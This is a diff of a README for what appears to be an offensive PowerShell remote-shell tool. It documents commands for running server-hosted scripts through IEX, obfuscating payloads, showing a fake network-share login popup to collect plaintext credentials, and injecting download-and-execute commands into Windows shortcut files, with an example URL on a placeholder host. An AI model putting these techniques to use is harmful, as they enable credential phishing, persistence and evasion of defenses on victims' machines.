@@ -42,32 +42,31 @@ Displays a summary of current host
 Executes script hosted server side in /var/async-shell/ps-scripts by IEX 
 requires the name of the script filename as a parameter.
 
-* obfuscate "name of text file / script"
-(shorcut method for use with text files)
+* obfuscate "name of text file / script"                                    
 Uses a polyalphabetic obfuscation method on base64 strings writes obfuscated
 string to file and provides a de-obfuscation key.
 
-* de-obfuscate "(name of text file / script), (key)"
-(shorcut method for use with text files)
+* de-obfuscate "(name of text file / script), (key)"                            
 Performs the inverse of the obfuscation function requires the text file with the
 obfuscated base64 data and de-obfuscation key as parameters.
 
-* gen-key
-generates a random alphabetic string for use with the obfuscate-base64 function
+* gen-key                                                                      
+generates a random alphabetic string for use with the obfuscate-base64 function.
 
 * obfuscate-base64 "(action:hide or clear ), (key: obfuscation or de-ofuscation), (base64-string)"
 The function that contains the obfuscation engine, it works only with clear base64 data.
 
-* byte-encode ( binary-to-obfuscate, key ) Performs byte-encoding prior to converting to 
-obfuscated base64 provide key de-obfuscation
+* byte-encode ( binary-to-obfuscate, key )                                                
+Performs byte-encoding prior to converting to obfuscated base64 provide key de-obfuscation.
 
-* byte-decode ( file-containing-obfu-base64, key ) performs the reverse of byte-encode 
-requires the de-obfuscation key.
+* byte-decode ( file-containing-obfu-base64, key )                                    
+performs the reverse of byte-encode, requires the de-obfuscation key.
 
-* askfor-creds 
-creates a dialog box prompting the user for credentials.
+* askfor-creds                                                                         
+Performs some social engineering inorder to aquire plain-text credentials. This is done
+by generating a authentication popup which seems to reconnect to a network share.
 
-* gen-enccmd "your command string"
+* gen-enccmd "your command string"                                                  
 Generates a PowerShell formatted encoded command. Insure to quote your command
 string.
 
@@ -75,14 +74,11 @@ string.
 gen-enccmd "cmd /c ipconfig /all"
 ```
 
-* shortcut-inject "name-of-lnk" "Url-hosting-script"
+* shortcut-inject "name-of-lnk" "Url-hosting-script"                                   
 Modifies the specified shortcut to run the original program and also execute a download
 and execute command string. Ex: "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
 Requires the http:// or https:// in the URL.
 
-* askfor-creds
-Performs some social engineering inorder to aquire plain-text credentials. This is done
-by generating a authentication popup which seems to reconnect to a network share.
 
 ### caveats
 Depending on your command structure and use of special characters you may need
